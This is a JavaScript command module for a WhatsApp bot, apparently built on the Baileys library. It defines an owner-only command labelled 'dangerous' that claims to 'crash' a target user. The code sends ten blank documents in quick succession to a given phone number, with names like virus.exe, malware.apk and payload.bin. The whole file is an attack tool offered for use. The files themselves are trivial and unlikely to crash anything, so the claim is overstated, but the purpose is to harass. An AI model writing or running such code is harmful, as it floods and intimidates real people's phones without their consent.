export default {
  name: 'docbug',
  description: 'Send document bug to crash user',
  category: 'dangerous',
  aliases: ['documentbug', 'filebug'],
  ownerOnly: true,
  async execute(sock, msg, args, prefix) {
    const chatId = msg.key.remoteJid;
    const target = args[0];

    if (!target) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ☠️ DOCUMENT BUG 〕━━━┈⊷
┃ Send document bug to crash user.
┃ 
┃ Usage: ${prefix}docbug <number>
┃ 
┃ Example: ${prefix}docbug 27797352930
┃ 
┃ 🧛 "The darkness corrupts."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
      return;
    }

    const userJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    await sock.sendMessage(chatId, {
      text: `╭━━━〔 ☠️ DOCUMENT BUG SENT 〕━━━┈⊷
┃ 👤 Target: ${userJid}
┃ 
┃ 🧛 "The darkness corrupts..."
╰━━━━━━━━━━━━━━━┈⊷`
    }, { quoted: msg });

    try {
      const fileNames = [
        'crash.docx', 'bug.pdf', 'virus.exe', 'malware.apk',
        'system.exe', 'hack.bat', 'exploit.js', 'payload.bin'
      ];

      for (let i = 0; i < 10; i++) {
        try {
          const buffer = Buffer.from(' '.repeat(1000));
          await sock.sendMessage(userJid, {
            document: buffer,
            fileName: fileNames[i % fileNames.length],
            mimetype: 'application/octet-stream'
          });
          await new Promise(resolve => setTimeout(resolve, 150));
        } catch {}
      }

      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ✅ DOCUMENT BUG SENT 〕━━━┈⊷
┃ 👤 ${target} document bug sent!
┃ 
┃ 🧛 "The darkness corrupts."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });

    } catch (error) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ ${error.message}
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }
  }
};
